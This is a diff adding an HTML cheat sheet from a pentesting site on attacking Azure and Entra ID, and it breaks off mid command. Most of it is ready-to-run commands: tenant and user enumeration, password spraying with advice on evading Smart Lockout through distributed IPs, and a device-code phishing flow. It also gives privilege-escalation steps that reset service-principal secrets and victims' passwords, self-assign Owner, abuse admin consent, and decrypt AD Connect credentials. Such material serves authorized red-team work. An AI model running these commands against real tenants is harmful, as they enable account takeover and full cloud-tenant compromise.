@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Azure | JinPwn</title><meta name="description" content="Azure &#43; Entra ID (formerly Azure AD) attack surface. Hybrid AD integration covered briefly here, full on-prem AD in 00 AD MOC .">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/cloud/azure/">
+<meta property="og:title" content="Azure | JinPwn">
+<meta property="og:description" content="Azure &#43; Entra ID (formerly Azure AD) attack surface. Hybrid AD integration covered briefly here, full on-prem AD in 00 AD MOC .">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/cloud/azure/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Azure | JinPwn">
+<meta name="twitter:description" content="Azure &#43; Entra ID (formerly Azure AD) attack surface. Hybrid AD integration covered briefly here, full on-prem AD in 00 AD MOC .">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Azure + Entra ID (formerly Azure AD) attack surface. Hybrid AD integration covered briefly here, full on-prem AD in 00 AD MOC .","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Azure | JinPwn","url":"https://jinpwn.dev/cheatsheets/cloud/azure/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Cloud Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/cloud/" class="cheatsheet-sidebar-section">Cloud Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/cloud/00-cloud-moc/" class="cheatsheet-sidebar-link">Cloud MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/cloud-recon/" class="cheatsheet-sidebar-link">Cloud Recon</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/cloud-storage/" class="cheatsheet-sidebar-link">Cloud Storage</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/aws/" class="cheatsheet-sidebar-link">AWS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/azure/" class="cheatsheet-sidebar-link is-current">Azure</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/gcp/" class="cheatsheet-sidebar-link">GCP</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>Azure</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">Azure</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Cloud Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/cloud/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/00-cloud-moc/" class="cheatsheet-mobile-sections-link">Cloud MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/cloud-recon/" class="cheatsheet-mobile-sections-link">Cloud Recon</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/cloud-storage/" class="cheatsheet-mobile-sections-link">Cloud Storage</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/aws/" class="cheatsheet-mobile-sections-link">AWS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/azure/" class="cheatsheet-mobile-sections-link is-current">Azure</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/gcp/" class="cheatsheet-mobile-sections-link">GCP</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>Azure + Entra ID (formerly Azure AD) attack surface. Hybrid AD integration covered briefly here, full on-prem AD in <a href="https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/">00 AD MOC</a>
+.</p>
+<div class="obsidian-callout callout-info">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle>
+          <path d="M12 16v-4"></path>
+          <path d="M12 8h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">Naming</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>Microsoft rebranded &ldquo;Azure AD&rdquo; to &ldquo;Entra ID&rdquo; in 2023. Same product, same APIs. Tools still use &ldquo;AAD&rdquo; interchangeably. This file uses &ldquo;Entra ID&rdquo; for the identity layer and &ldquo;Azure&rdquo; for the resource layer.</p>
+  </div>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">TENANT</span><span class="o">=</span>target.onmicrosoft.com
+</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;user@target.com&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password1&#39;</span>
+</span></span></code></pre></div><h2 id="i-pre-auth-tenant-enumeration" data-heading-permalink="true"><span class="heading-content">i. Pre-auth: tenant enumeration</span>
+    <a class="heading-permalink" href="#i-pre-auth-tenant-enumeration" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>You don&rsquo;t need credentials to enumerate a tenant&rsquo;s basic info. Public endpoints give you a lot.</p>
+<p>Find the tenant ID from a domain:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;https://login.microsoftonline.com/</span><span class="nv">$TENANT</span><span class="s2">/.well-known/openid-configuration&#34;</span> <span class="p">|</span> jq -r .token_endpoint
+</span></span><span class="line"><span class="cl"><span class="c1">## Tenant ID appears in the URL: /TENANT_ID/oauth2/v2.0/token</span>
+</span></span></code></pre></div><p>OpenID Connect metadata reveals SSO config, federation, supported flows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;https://login.microsoftonline.com/</span><span class="nv">$TENANT</span><span class="s2">/v2.0/.well-known/openid-configuration&#34;</span> <span class="p">|</span> jq
+</span></span></code></pre></div><p>User existence check (no creds needed, no login attempt):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;https://login.microsoftonline.com/common/GetCredentialType&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H <span class="s2">&#34;Content-Type: application/json; charset=UTF-8&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s1">&#39;{&#34;Username&#34;:&#34;target@example.com&#34;}&#39;</span> <span class="p">|</span> jq
+</span></span><span class="line"><span class="cl"><span class="c1">## &#34;IfExistsResult&#34;: 0 = exists, 1 = does not exist, 5 = federated to external IdP</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## &#34;ThrottleStatus&#34;: 1 = blocked, do not retry quickly</span>
+</span></span></code></pre></div><p>Onyphe / shodan / cert transparency for <code>*.onmicrosoft.com</code> and <code>*.cloudapp.azure.com</code> discovery.</p>
+<h2 id="ii-password-spray-entra-id" data-heading-permalink="true"><span class="heading-content">ii. Password spray Entra ID</span>
+    <a class="heading-permalink" href="#ii-password-spray-entra-id" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Way less risky than on-prem AD because lockout is per-IP and slower:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## With MSOLSpray (still widely used)</span>
+</span></span><span class="line"><span class="cl">python3 MSOLSpray.py --userlist users.txt --password <span class="s1">&#39;Winter2025!&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## With nxc (Linux):</span>
+</span></span><span class="line"><span class="cl">nxc azure --userlist users.txt --password <span class="s1">&#39;Winter2025!&#39;</span> --tenant <span class="nv">$TENANT</span>
+</span></span></code></pre></div><p>MFASweep (find users without MFA across many MS services):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## PowerShell:</span>
+</span></span><span class="line"><span class="cl">Import-Module .<span class="se">\M</span>FASweep.ps1
+</span></span><span class="line"><span class="cl">Invoke-MFASweep -Username user@target.com -Password <span class="s1">&#39;Password1&#39;</span> -Recon
+</span></span></code></pre></div><div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">Smart Lockout</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>Entra ID has Smart Lockout (default 10 failures per IP per ~60 min). Use distributed source IPs or wait between sprays.</p>
+  </div>
+</div>
+<h2 id="iii-auth-methods-to-know" data-heading-permalink="true"><span class="heading-content">iii. Auth methods to know</span>
+    <a class="heading-permalink" href="#iii-auth-methods-to-know" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Each auth method has different log signatures and detection profiles:</p>
+<h3 id="password-auth-ropc-grant_typepassword" data-heading-permalink="true"><span class="heading-content">Password auth (ROPC, <code>grant_type=password</code>)</span>
+    <a class="heading-permalink" href="#password-auth-ropc-grant_typepassword" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>Direct OAuth password grant. Modern tenants often disable this. Try first because it gives access tokens directly with no MFA when conditional access doesn&rsquo;t fire on Service Principal-style flows.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s <span class="s2">&#34;https://login.microsoftonline.com/</span><span class="nv">$TENANT</span><span class="s2">/oauth2/v2.0/token&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s2">&#34;client_id=1b730954-1685-4b74-9bfd-dac224a7b894&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s2">&#34;scope=https://graph.microsoft.com/.default&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s2">&#34;username=</span><span class="nv">$USER</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s2">&#34;password=</span><span class="nv">$PASS</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s2">&#34;grant_type=password&#34;</span> <span class="p">|</span> jq
+</span></span></code></pre></div><h3 id="device-code-flow-best-for-evading-conditional-access-by-impersonating-mobileconsole-apps" data-heading-permalink="true"><span class="heading-content">Device Code Flow (best for evading conditional access by impersonating mobile/console apps)</span>
+    <a class="heading-permalink" href="#device-code-flow-best-for-evading-conditional-access-by-impersonating-mobileconsole-apps" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Step 1: ask for a device code</span>
+</span></span><span class="line"><span class="cl">curl -s <span class="s2">&#34;https://login.microsoftonline.com/</span><span class="nv">$TENANT</span><span class="s2">/oauth2/v2.0/devicecode&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s2">&#34;client_id=1b730954-1685-4b74-9bfd-dac224a7b894&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s2">&#34;scope=https://graph.microsoft.com/.default offline_access&#34;</span> <span class="p">|</span> jq
+</span></span><span class="line"><span class="cl"><span class="c1">## Returns user_code, device_code, verification_uri</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Step 2: phish the user to visit verification_uri and enter user_code</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Step 3: poll for token</span>
+</span></span><span class="line"><span class="cl">curl -s <span class="s2">&#34;https://login.microsoftonline.com/</span><span class="nv">$TENANT</span><span class="s2">/oauth2/v2.0/token&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s2">&#34;grant_type=urn:ietf:params:oauth:grant-type:device_code&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s2">&#34;client_id=1b730954-1685-4b74-9bfd-dac224a7b894&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -d <span class="s2">&#34;device_code=DEVICE_CODE&#34;</span>
+</span></span></code></pre></div><p>TokenTactics automates this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/rvrsh3ll/TokenTactics
+</span></span><span class="line"><span class="cl">Import-Module .<span class="se">\T</span>okenTactics.psd1
+</span></span><span class="line"><span class="cl">Get-AzureToken -Client MSGraph
+</span></span></code></pre></div><h3 id="az-cli--az-powershell" data-heading-permalink="true"><span class="heading-content">Az CLI / Az PowerShell</span>
+    <a class="heading-permalink" href="#az-cli--az-powershell" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az login                          <span class="c1">## interactive</span>
+</span></span><span class="line"><span class="cl">az login --service-principal -u APP_ID -p CLIENT_SECRET --tenant TENANT_ID
+</span></span><span class="line"><span class="cl">az login --use-device-code        <span class="c1">## device code flow</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## After login:</span>
+</span></span><span class="line"><span class="cl">az account show
+</span></span><span class="line"><span class="cl">az account list
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Connect-AzAccount</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Connect-AzAccount</span> <span class="n">-Credential</span> <span class="p">(</span><span class="nb">Get-Credential</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Connect-AzAccount</span> <span class="n">-ServicePrincipal</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Tenant</span> <span class="n">TENANT_ID</span>
+</span></span></code></pre></div><h2 id="iv-roadtools-the-modern-enum-stack" data-heading-permalink="true"><span class="heading-content">iv. ROADtools (the modern enum stack)</span>
+    <a class="heading-permalink" href="#iv-roadtools-the-modern-enum-stack" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>ROADtools = <code>roadrecon</code> (collector) + <code>roadtools</code> (graph viewer). Closer to BloodHound in spirit.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Auth and dump:</span>
+</span></span><span class="line"><span class="cl">roadrecon auth -u user@target.com -p Password1
+</span></span><span class="line"><span class="cl"><span class="c1">## Or use device code:</span>
+</span></span><span class="line"><span class="cl">roadrecon auth --device-code
+</span></span><span class="line"><span class="cl"><span class="c1">## Then collect:</span>
+</span></span><span class="line"><span class="cl">roadrecon gather
+</span></span><span class="line"><span class="cl"><span class="c1">## Output: roadrecon.db (SQLite with everything)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Browse the data:</span>
+</span></span><span class="line"><span class="cl">roadrecon gui
+</span></span><span class="line"><span class="cl"><span class="c1">## Open http://localhost:5000</span>
+</span></span></code></pre></div><p>Specific queries from the database:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">roadrecon dump --type users
+</span></span><span class="line"><span class="cl">roadrecon dump --type applications
+</span></span><span class="line"><span class="cl">roadrecon dump --type approles
+</span></span><span class="line"><span class="cl">roadrecon dump --type roleassignments
+</span></span></code></pre></div><h2 id="v-azurehound-bloodhound-ce-collector-for-entra-id" data-heading-permalink="true"><span class="heading-content">v. AzureHound (BloodHound CE collector for Entra ID)</span>
+    <a class="heading-permalink" href="#v-azurehound-bloodhound-ce-collector-for-entra-id" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>For BloodHound CE Azure analysis:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">./azurehound -u user@target.com -p Password1 -t TENANT_ID list -o output.json
+</span></span><span class="line"><span class="cl"><span class="c1">## Then in BloodHound CE: upload output.json (or zip it)</span>
+</span></span></code></pre></div><p>Use BloodHound&rsquo;s Azure-specific edges to find privesc paths in Entra ID.</p>
+<h2 id="vi-aadinternals" data-heading-permalink="true"><span class="heading-content">vi. AADInternals</span>
+    <a class="heading-permalink" href="#vi-aadinternals" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>PowerShell module with deep tenant manipulation capabilities. Use cases include hybrid AD attacks, federation hijack, immutable ID abuse.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Install-Module</span> <span class="n">AADInternals</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="n">AADInternals</span>
+</span></span><span class="line"><span class="cl"><span class="c">## Login</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$at</span> <span class="p">=</span> <span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-Credentials</span> <span class="nv">$cred</span>
+</span></span><span class="line"><span class="cl"><span class="c">## Tenant info without auth:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-AADIntTenantDomains</span> <span class="n">-Domain</span> <span class="n">target</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-AADIntLoginInformation</span> <span class="n">-Domain</span> <span class="n">target</span><span class="p">.</span><span class="py">com</span>
+</span></span><span class="line"><span class="cl"><span class="c">## Whoami:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-AADIntAccessTokenInfo</span> <span class="n">-AccessToken</span> <span class="nv">$at</span>
+</span></span></code></pre></div><h2 id="vii-common-entra-id-roles-to-look-for" data-heading-permalink="true"><span class="heading-content">vii. Common Entra ID roles to look for</span>
+    <a class="heading-permalink" href="#vii-common-entra-id-roles-to-look-for" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Get all role assignments:</span>
+</span></span><span class="line"><span class="cl">az role assignment list --all
+</span></span><span class="line"><span class="cl"><span class="c1">## Or via Microsoft Graph:</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;Authorization: Bearer </span><span class="nv">$TOKEN</span><span class="s2">&#34;</span> <span class="s2">&#34;https://graph.microsoft.com/v1.0/directoryRoles&#34;</span>
+</span></span></code></pre></div><p>High-value Entra ID directory roles:</p>
+<ul>
+<li><strong>Global Administrator</strong> - full tenant admin</li>
+<li><strong>Privileged Role Administrator</strong> - can assign other roles, recursive privilege escalation</li>
+<li><strong>Privileged Authentication Administrator</strong> - reset passwords of admins</li>
+<li><strong>User Administrator</strong> - reset passwords of non-admins (and add to groups)</li>
+<li><strong>Application Administrator</strong> / <strong>Cloud Application Administrator</strong> - abuse service principals, add credentials</li>
+<li><strong>Hybrid Identity Administrator</strong> - manage AD Connect</li>
+</ul>
+<h2 id="viii-azure-rbac-roles" data-heading-permalink="true"><span class="heading-content">viii. Azure RBAC roles</span>
+    <a class="heading-permalink" href="#viii-azure-rbac-roles" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Different from Entra ID directory roles. Govern resources (subscriptions, resource groups, VMs).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## At subscription level:</span>
+</span></span><span class="line"><span class="cl">az role assignment list --all --include-inherited
+</span></span><span class="line"><span class="cl"><span class="c1">## Find Owner / Contributor / User Access Administrator assignments:</span>
+</span></span><span class="line"><span class="cl">az role assignment list --all --include-inherited --query <span class="s2">&#34;[?roleDefinitionName==&#39;Owner&#39;]&#34;</span>
+</span></span></code></pre></div><p><strong>Owner</strong> + <strong>User Access Administrator</strong> are the dangerous Azure RBAC roles. Owner can do anything in scope, UAA can grant any other role.</p>
+<h2 id="ix-privilege-escalation-paths" data-heading-permalink="true"><span class="heading-content">ix. Privilege escalation paths</span>
+    <a class="heading-permalink" href="#ix-privilege-escalation-paths" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="add-credentials-to-a-service-principal-you-have-rights-on" data-heading-permalink="true"><span class="heading-content">Add credentials to a service principal you have rights on</span>
+    <a class="heading-permalink" href="#add-credentials-to-a-service-principal-you-have-rights-on" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az ad sp credential reset --id &lt;APP_ID&gt;
+</span></span><span class="line"><span class="cl"><span class="c1">## Returns new client secret</span>
+</span></span><span class="line"><span class="cl">az login --service-principal -u APP_ID -p NEW_SECRET --tenant TENANT_ID
+</span></span></code></pre></div><p>If the SP has high-value API permissions or RBAC roles, you&rsquo;ve inherited them.</p>
+<h3 id="reset-another-users-password-user-administrator-or-higher" data-heading-permalink="true"><span class="heading-content">Reset another user&rsquo;s password (User Administrator or higher)</span>
+    <a class="heading-permalink" href="#reset-another-users-password-user-administrator-or-higher" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az ad user update --id victim@target.com --password <span class="s1">&#39;NewP@ss123!&#39;</span>
+</span></span></code></pre></div><h3 id="owner--uaa-escalation" data-heading-permalink="true"><span class="heading-content">Owner / UAA escalation</span>
+    <a class="heading-permalink" href="#owner--uaa-escalation" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>You&rsquo;re Owner on a subscription. Add yourself as Owner of another scope (or User Access Administrator at the management group level):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az role assignment create --assignee user@target.com --role <span class="s1">&#39;Owner&#39;</span> --scope /subscriptions/SUB_ID
+</span></span></code></pre></div><h3 id="adding-api-permissions-to-a-sp-you-own-consent-abuse" data-heading-permalink="true"><span class="heading-content">Adding API permissions to a SP you own (consent abuse)</span>
+    <a class="heading-permalink" href="#adding-api-permissions-to-a-sp-you-own-consent-abuse" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>When you control a service principal AND can grant admin consent, give yourself any Graph permission:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">az ad app permission add --id APP_ID --api 00000003-0000-0000-c000-000000000000 --api-permissions &lt;PERM_GUID&gt;<span class="o">=</span>Role
+</span></span><span class="line"><span class="cl">az ad app permission grant --id APP_ID --api 00000003-0000-0000-c000-000000000000
+</span></span><span class="line"><span class="cl">az ad app permission admin-consent --id APP_ID
+</span></span></code></pre></div><p><code>RoleManagement.ReadWrite.Directory</code> is the holy grail - lets the SP assign itself any directory role, including Global Administrator.</p>
+<h3 id="hybrid-ad-azure-ad-connect-server-compromise" data-heading-permalink="true"><span class="heading-content">Hybrid AD: Azure AD Connect server compromise</span>
+    <a class="heading-permalink" href="#hybrid-ad-azure-ad-connect-server-compromise" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>AD Connect syncs on-prem AD to Entra ID. The AD Connect server has:</p>
+<ul>
+<li>The MSOL_xxxxx account in on-prem AD (with DCSync rights)</li>
+<li>The cleartext password for the Entra ID sync account, stored encrypted on the AD Connect host</li>
+<li>Compromising AD Connect = compromise both on-prem AD AND Entra ID</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb aadconnect.corp.local -u user -p pass -M adsyncdecrypt
